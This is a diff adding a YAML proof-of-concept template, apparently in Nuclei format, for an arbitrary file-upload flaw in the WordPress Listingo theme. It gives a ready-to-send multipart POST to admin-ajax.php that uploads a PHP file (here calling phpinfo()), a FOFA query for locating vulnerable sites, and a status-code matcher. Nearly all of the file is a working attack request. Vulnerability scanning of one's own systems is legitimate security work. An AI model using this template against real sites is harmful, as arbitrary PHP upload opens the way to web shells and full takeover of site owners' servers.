@@ -1,0 +1,79 @@
+id: poc-mmiry1xzlq5q5s34
+info:
+  name: WordPress listingo 文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mmiry1xzlq5q5s34'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: mmiry1xzlq5q5s34
+    fofa: body="wp-content/themes/listingo"
+http:
+- raw:
+  - 'POST /wp-admin/admin-ajax.php?action=listingo_temp_uploader HTTP/1.1
+
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8rVjnfcgxgKoytcg
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+
+
+    ------WebKitFormBoundary8rVjnfcgxgKoytcg
+
+
+    Content-Disposition: form-data; name="listingo_uploader";filename="1008.php"
+
+
+    Content-Type:text/php
+
+
+
+
+    <?php
+
+
+    phpinfo();
+
+
+    ?>
+
+
+    ------WebKitFormBoundary8rVjnfcgxgKoytcg
+
+
+    Content-Disposition: form-data; name="submit"
+
+
+
+
+    Start Uploader
+
+
+    ------WebKitFormBoundary8rVjnfcgxgKoytcg--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    wp-custom-uploader
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
